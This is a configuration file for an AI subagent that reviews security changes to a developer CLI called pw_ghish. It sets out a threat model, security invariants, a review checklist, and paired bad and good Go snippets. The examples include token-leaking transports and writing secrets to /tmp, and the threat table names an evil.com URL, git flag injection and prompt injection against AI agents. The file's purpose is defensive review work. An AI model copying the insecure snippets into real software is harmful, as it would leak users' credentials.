---
name: ghish-security-reviewer
description: >-
  Reviews pw_ghish and ./gh changes exclusively for security vulnerabilities
  against the pw_ghish Threat Model (T1-T8), Security Invariants (SEC-INV-1
  through SEC-INV-10), Common Failings, and Mandatory Security Review Checklist.
  Invoke only from the review coordinator (/review) with a patch of files under
  pw_ghish/ or ./gh; do not invoke for unrelated modules. Read-only: never edits
  files or posts to Gerrit.
subagent: true
mainAgent: false
disabled: true
tools:
  - view_file
---

# `pw_ghish` Security Reviewer Guide (`ghish_security_reviewer.md`)

Canonical security review guide for changes to `pw_ghish` (`./gh`). When invoked
by `/review` (or during manual code review), evaluate every hunk touching
`pw_ghish/` or `./gh` against the Threat Model, Security Invariants, Common
Failings, and Review Checklist below.

---

## 1. Threat Model

`pw_ghish` is a high-privilege developer and AI-agent CLI that bridges local Git
repositories with four sensitive Google and open-source backends:

1. **Gerrit Code Review** (`*.googlesource.com` via `gob-curl`, `luci-auth`, or
   `.gitcookies`)
2. **LUCI Buildbucket & LogDog** (`*.appspot.com`, `*.luci.app`)
3. **Google Issue Tracker / Buganizer** (`issuetracker.googleapis.com` and 1P
   internal `issuetracker.corp.googleapis.com` via `sso_client`)
4. **Android Busytown / Build Internal** (`androidbuildinternal.googleapis.com`,
   `ci.android.com`, and `/google/data/ro/projects/android/...`)

Because `pw_ghish` runs on **Googler workstations (Corp Linux Cloudtops and Corp
macOS laptops)** as well as external contributor machines—and is frequently
invoked inside **AI coding agents and build sandboxes**—reviewers must assume the
following threats:

| Threat ID | Threat Actor / Vector | What They Can Access | Impact if Exploited |
| :--- | :--- | :--- | :--- |
| **T1: Sandbox Credential Escape** | Sandboxed AI coding agents, Bazel test actions, or third-party build scripts running on the same machine. | Typically blocked from reading `~/.ssh`, `~/.config/chrome_infra/auth`, and `~/.gitcookies`, **but allowed to read/write `/tmp`, the Git workspace, and often `~/.cache`**. | If `pw_ghish` writes bearer tokens, refresh tokens, or SSO headers into `/tmp`, `out/`, or `~/.cache/ghish/`, a sandboxed process can steal live `@google.com` credentials. |
| **T2: Local Process & Binary Planting** | Unprivileged local software running under the developer's UID (`npm` postinstall scripts, `pip` setup.py, untrusted repo hooks) or shared-host users. | Files in world-writable directories (`/tmp`), unverified downloaded binaries, or group/world-writable cache directories. | Trojanizing a helper binary (`luci-auth`, `gh-ish`) or reading leftover tempfiles after a `SIGKILL`. |
| **T3: Cross-Origin & Redirect Token Leakage** | Malicious URL passed on the CLI (`./gh pr view https://evil.com/...`), malicious `.ghish.toml` in an untrusted repo, or an HTTP `302` redirect to an external domain. | Any HTTP request made by `pw_ghish` transports. | Exfiltrating a user's `Authorization: Bearer` token, `.gitcookies`, or `gob-curl`/`sso_client` ticket to an attacker-controlled server. |
| **T4: Over-Scoped "God Tokens"** | Any compromised backend endpoint, proxy, or leaked request header. | The OAuth2 `access_token` sent on that request. | If a token carries `cloud-platform` or a union of all scopes (`gerritcodereview` + `buganizer` + `androidbuild.internal`), leaking one token compromises GCP projects, source code, and internal bugs simultaneously. |
| **T5: 1P Corp Policy & RAPT Bypass** | Custom OAuth flows or custom refresh-token stores that bypass `gcert` or `luci-auth`. | Long-lived refresh tokens stored on disk without Google ReAuth / RAPT (20-hour hardware security key proof). | Weakens Google Corp's 20-hour hardware-key session boundary and leaves orphaned tokens behind after `luci-auth logout`. |
| **T6: Log, Error & Transcript Leakage** | Terminal scrollback, CI build logs, crash dumps, and AI agent conversation transcripts. | Everything printed to `stdout` or `stderr` (including under `-v` / `--verbose`). | Recording live bearer tokens, cookies, or internal URLs into persistent logs or LLM context windows. |
| **T7: Untrusted Remote Content Injection** | External users posting Gerrit review comments, CL descriptions, Buganizer issue bodies, or CI failure logs. | Text rendered by `./gh pr view`, `./gh issue view`, `./gh run view`, or `./gh sense`. | Terminal ANSI escape sequence injection (terminal takeover) or LLM prompt injection against AI agents reading `./gh` output. |
| **T8: Subprocess Argument / Command Injection** | Crafted branch names, commit messages, file paths, or config values starting with `-` or containing shell metacharacters. | Arguments passed to `git`, `gob-curl`, `sso_client`, `luci-auth`, or `fetch_artifact`. | Arbitrary flag injection (e.g., `--upload-pack=...`, `--flagfile=...`, `--output=...`) or arbitrary command execution. |

---

## 2. Security Invariants to Retain

Every change to `pw_ghish` must preserve these ten invariants. Cite the
invariant ID (`SEC-INV-*`) in review comments when flagging a violation.

* **`SEC-INV-1` (No Secrets in State Cache, Workspace, or `/tmp`)**:
  `pw_ghish` must never write raw OAuth access tokens (`ya29...`), refresh
  tokens (`1//...`), Git cookies, or `Authorization` headers to `/tmp`, the Git
  workspace (`out/`), or `~/.cache/ghish/auth_state.json`; cached auth state
  must contain only non-secret metadata (status, account email, scope names,
  expiry timestamps, and credential file `mtime` fingerprints).
* **`SEC-INV-2` (Single Canonical Secret Store & Clean Logout)**:
  Persistent OAuth tokens must live exclusively in `luci-auth`'s canonical store
  (`~/.config/chrome_infra/auth/tokens.json` or OS keychain) so that
  `./gh auth logout` and `luci-auth logout` revoke all cached credentials atomically.
* **`SEC-INV-3` (Per-Service Least-Privilege OAuth Scopes — Never `cloud-platform`)**:
  `pw_ghish` must request and attach only the minimal OAuth scope required by
  each target service (`userinfo.email` for LUCI Buildbucket/LogDog, `buganizer`
  for Issue Tracker, `gerritcodereview` for Gerrit, `androidbuild.internal` for
  Busytown) and must never request the superuser
  `https://www.googleapis.com/auth/cloud-platform` scope for normal operations.
* **`SEC-INV-4` (Preserve 1P Hardware-Backed Auth Priority & RAPT)**:
  On Corp machines, `pw_ghish` must prefer in-memory `ssh-agent` tickets
  (`gob-curl` / `sso_client` backed by `gcert`) over disk-cached OAuth tokens,
  and must delegate OAuth login/refresh to the official `luci-auth` binary so
  Google Corp's 20-hour ReAuth/RAPT hardware-key policy is enforced.
* **`SEC-INV-5` (Strict HTTPS & Host Allowlisting Before Attaching Credentials)**:
  Every authenticated HTTP `RoundTripper` and CLI wrapper (`GobCurlTransport`,
  `TokenTransport`, `LUCIAuthTransport`, `AndroidBuildAuthTransport`,
  `ssoClientRoundTripper`, `CookieTransport`) must verify `req.URL.Scheme == "https"`
  and validate `req.URL.Host` against an explicit domain suffix allowlist for
  that credential type before attaching credentials, and must strip
  `Authorization` and `Cookie` headers on cross-host HTTP redirects.
* **`SEC-INV-6` (Cryptographic & Permission Verification of Bootstrapped Binaries)**:
  Any helper binary downloaded or staged by `pw_ghish` in a user-writable
  directory (such as `luci-auth` in `~/.local/share/ghish/bin/`, as opposed to
  root-owned OS binaries in `/usr/bin` or `/bin`) must be verified against a
  compiled-in SHA256 digest and stored in a directory owned by `os.Getuid()`
  created with mode `0700` and verified to have no group or world write
  permissions (`go-w`, `mode & 0022 == 0`).
* **`SEC-INV-7` (No Silent Error Swallowing in Auth or Tool Discovery)**:
  Auth and tool-discovery probes must never silently discard subprocess `stderr`
  or OS permission errors (`EPERM` / macOS TCC blocks); failures must be
  recorded in `auth_state.json` and surfaced with exact root causes.
* **`SEC-INV-8` (Redact Secrets from All Logs, Errors, and Debug Output)**:
  `--verbose` logging, error messages, and JSON outputs must redact
  `Authorization`, `Cookie`, and `X-Goog-Spatula` / ticket headers and must
  never print raw token strings.
* **`SEC-INV-9` (Sanitize & Fence All Untrusted Remote Text)**:
  All user-controlled strings fetched from Gerrit, Buganizer, or CI logs (titles,
  descriptions, comments, author names, log snippets) must pass through
  `SanitizeUntrustedText` (stripping terminal control/ANSI escape characters)
  and multi-line bodies must be wrapped in `FormatUntrustedBlock` fences.
* **`SEC-INV-10` (No Shell Invocation & Strict Subprocess Flag Termination)**:
  External commands must be invoked via `exec.CommandContext` (never `sh -c`),
  header/flag values passed to `gob-curl` or `sso_client` must strip CR/LF/null
  bytes, and positional Git arguments derived from user/remote input must follow
  `--` where supported.

---

## 3. Common Failings & Anti-Patterns to Look For

### 3.1. Writing Sensitive Headers or Tokens to `/tmp` (`SEC-INV-1`)

**Why it happens:** CLI wrappers like `sso_client` or `gob-curl` accept
`--flagfile=<path>` or `--data_file=<path>`. Developers call
`os.CreateTemp("", "ghish-*")`, which defaults to `/tmp`.
**Why it is a blocking vulnerability:** `/tmp` is readable inside AI agent and
Bazel sandboxes, and if the process receives `SIGKILL`, `defer os.Remove(...)`
does not run, leaving bearer tokens on disk in `/tmp`.

**Bad:**
```go
// BLOCKING: Writes req.Header (including "Authorization: Bearer ya29...") to /tmp!
flagPath, err := os.CreateTemp("", "ghish-sso-headers-*")
```

**Good:**
```go
// Pass non-secret headers via CLI flags, or use a 0700 user-private runtime dir
// (~/.local/share/ghish/run/) and never write Authorization bearer tokens to disk.
```

---

### 3.2. Caching Raw Bearer or Refresh Tokens in `auth_state.json` (`SEC-INV-1`, `SEC-INV-2`)

**Why it happens:** To make pre-flight checks fast, a developer serializes the
token string itself into `~/.cache/ghish/auth_state.json`.
**Why it is a blocking vulnerability:** Duplicates credentials outside
`~/.config/chrome_infra/auth/tokens.json`, survives `luci-auth logout`, and
exposes tokens to any sandboxed tool with read access to `~/.cache`.

**Bad:**
```go
type CachedOAuthState struct {
    AccessToken  string    `json:"accessToken"`  // BLOCKING: Secret in ~/.cache!
    RefreshToken string    `json:"refreshToken"` // BLOCKING: Long-lived secret in ~/.cache!
    Expiry       time.Time `json:"expiry"`
}
```

**Good:**
```go
type CachedOAuthState struct {
    Status        string    `json:"status"`        // "authenticated", "not_logged_in", "missing_scopes"
    Account       string    `json:"account"`       // "keir@google.com"
    GrantedScopes []string  `json:"grantedScopes"` // Scope URLs only, no token value
    TokenExpiry   time.Time `json:"tokenExpiry"`
}
```

---

### 3.3. Requesting `cloud-platform` or Multi-Service Scope Unions (`SEC-INV-3`)

**Why it happens:** Copy-pasting `gcloud` default scopes or combining all scopes
into a single `luci-auth token -scopes "..."` call for convenience.
**Why it is a blocking vulnerability:** `cloud-platform` grants full read/write
access to all GCP resources, which `pw_ghish` never needs for Gerrit, LUCI, or
Buganizer.

**Bad:**
```go
const DefaultBuganizerScopes = "https://www.googleapis.com/auth/buganizer https://www.googleapis.com/auth/cloud-platform"
```

**Good:**
```go
const ScopeBuganizer = "https://www.googleapis.com/auth/buganizer"
```

---

### 3.4. Unconditional `Authorization` Attachment Without Host Allowlisting (`SEC-INV-5`)

**Why it happens:** Writing an `http.RoundTripper` that calls
`req.Header.Set("Authorization", "Bearer "+tok)` without checking `req.URL.Host`
or configuring `CheckRedirect`.
**Why it is a blocking vulnerability:** Passing `--host evil.com`, an untrusted
URL argument, or following an HTTP redirect leaks the bearer token to an
external server.

**Bad:**
```go
func (t *MyAuthTransport) RoundTrip(req *http.Request) (*http.Response, error) {
    req.Header.Set("Authorization", "Bearer "+t.token) // BLOCKING: No scheme/host check!
    return t.Base.RoundTrip(req)
}
```

**Good:**
```go
func (t *MyAuthTransport) RoundTrip(req *http.Request) (*http.Response, error) {
    if !isAllowedHostForService(req.URL, t.service) {
        return nil, fmt.Errorf("refusing to send %s credentials to untrusted URL %q", t.service, req.URL.Redacted())
    }
    cloned := req.Clone(req.Context())
    cloned.Header.Set("Authorization", "Bearer "+t.token)
    return t.Base.RoundTrip(cloned)
}
```

---

### 3.5. Swallowing Subprocess `stderr` in Auth / Tool Probes (`SEC-INV-7`)

**Why it happens:** Calling `exec.CommandContext(ctx, bin, args...).Output()`
and ignoring both `err` and `stderr` when probing `luci-auth`, `gcloud`, or
`gob-curl`.
**Why it is a should-fix / blocking bug:** Masks OS permission errors (`EPERM` /
macOS TCC blocks on `~/Downloads`), expired RAPT sessions, and missing OAuth
scopes under a misleading generic error.

**Bad:**
```go
if out, err := exec.CommandContext(ctx, luciAuthBin, "token", "-scopes", sc).Output(); err == nil {
    return strings.TrimSpace(string(out)), nil
}
// Silently ignores err and stderr!
```

**Good:**
```go
var stdout, stderr bytes.Buffer
cmd := exec.CommandContext(ctx, luciAuthBin, "token", "-scopes", sc)
cmd.Stdout = &stdout
cmd.Stderr = &stderr
if err := cmd.Run(); err != nil {
    return "", classifyTokenCommandError(luciAuthBin, err, stderr.String())
}
```

---

## 4. Mandatory Security Review Checklist

When reviewing any change to `pw_ghish`, verify every item in this checklist:

### A. Credential Storage & Lifecycle
- [ ] **No secrets in cache or `/tmp` (`SEC-INV-1`)**: Does the change avoid
      writing bearer tokens, refresh tokens, cookies, or `Authorization` headers
      to `/tmp`, `out/`, or `~/.cache/ghish/auth_state.json`?
- [ ] **Canonical secret store (`SEC-INV-2`)**: Are persistent OAuth tokens kept
      exclusively in `luci-auth`'s store so `logout` revokes them cleanly?
- [ ] **Strict file permissions (`SEC-INV-6`)**: Are any state files or staged
      binary directories created with `0600` (files) / `0700` (directories)
      permissions, verified `go-w` (`mode & 0022 == 0`), and checked for
      ownership by `os.Getuid()`?

### B. OAuth Scopes & 1P Corp Authentication
- [ ] **Least-privilege scopes (`SEC-INV-3`)**: Does each backend request only
      its own minimal scope (`userinfo.email`, `buganizer`, `gerritcodereview`,
      or `androidbuild.internal`), and is `cloud-platform` absent from normal
      operational token requests?
- [ ] **Corp auth priority (`SEC-INV-4`)**: On Corp machines, does Gerrit
      transport prefer `gob-curl` (in-memory `ssh-agent` ticket) over
      disk-cached OAuth tokens when `gob-curl` is healthy?
- [ ] **ReAuth / RAPT preservation (`SEC-INV-4`)**: Does OAuth login/refresh
      delegate to the official SHA256-verified `luci-auth` binary rather than
      bypassing RAPT with a custom refresh-token store?

### C. HTTP Transports, URLs, & Redirects
- [ ] **HTTPS + Host allowlist (`SEC-INV-5`)**: Before attaching `Authorization`
      headers, cookies, or invoking `gob-curl` / `sso_client`, does the
      transport verify `req.URL.Scheme == "https"` and match `req.URL.Host`
      against the explicit allowlist for that service?
- [ ] **Cross-host redirect stripping (`SEC-INV-5`)**: Does `http.Client` strip
      `Authorization` and `Cookie` headers if an HTTP redirect crosses host
      boundaries?
- [ ] **Request cloning**: Does `RoundTrip` clone `req` (`req.Clone(req.Context())`)
      before mutating `req.Header` (per `http.RoundTripper` contract)?

### D. Subprocess, Binary, & Log Hygiene
- [ ] **Binary integrity (`SEC-INV-6`)**: If any helper binary is downloaded or
      staged by `pw_ghish` in a user-writable directory (outside root-owned OS
      directories like `/usr/bin`), is its SHA256 digest verified against a
      pinned constant before execution?
- [ ] **No silent auth failures (`SEC-INV-7`)**: Are `stderr` and OS permission
      errors (`EPERM` / macOS TCC) captured and reported when probing helper
      binaries?
- [ ] **Secret redaction in logs (`SEC-INV-8`)**: Are `Authorization`, `Cookie`,
      and token values redacted from `--verbose` debug logs and error returns?
- [ ] **Untrusted text sanitization (`SEC-INV-9`)**: Are all remote strings
      (issue titles/bodies, CL comments, author names, CI logs) sanitized with
      `SanitizeUntrustedText` / `FormatUntrustedBlock` before printing?
- [ ] **Safe subprocess execution (`SEC-INV-10`)**: Are subprocesses invoked
      directly without shells, with CR/LF stripped from header flags and `--`
      separating positional arguments where applicable?

---

## Workflow

Read and follow `.agents/skills/review/reviewer_workflow.md`.
Return findings in its Finding format and nothing else.
